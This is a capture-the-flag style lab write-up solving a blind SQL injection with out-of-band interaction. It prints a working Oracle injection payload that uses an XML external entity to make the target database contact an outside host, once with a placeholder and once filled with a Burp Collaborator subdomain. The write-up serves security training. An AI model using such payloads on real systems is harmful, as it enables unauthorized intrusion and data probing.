# Blind SQL injection with out-of-band interaction

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8419e01c-a6dc-4fcf-aca7-7b23bb768220)

## Solution

First we check to see if the website uses in-band or out-band by adding some custom values in tracking query. The result shows that the query is done by out-band.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/0dc1256c-9c34-42b2-8389-433932804413)

We use `Burp Collaborator` for performing the attack. Copy the subdomain by going into `Burp Collaborator` and clicking on `copy to clipboard`.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c6c64153-a87d-48c4-9b24-da1e87b8d2b9)

We use Burp's SQL Injection cheetsheet to find the payload which is `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--` .

Here we copy and paste the subdomain we recieved from Burp Collaborator in the http part of the payload. `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//4kpj39cvmacndrbk3g0mxbynve15pvdk.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/d8a97a9f-7664-4f42-8aca-a4ef804f7f5b)

If we go to Burp Collaborator agian we can see the result of the DNS lookup we did
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/1c3d8e4c-630a-4b59-ab05-cd58db5bc109)
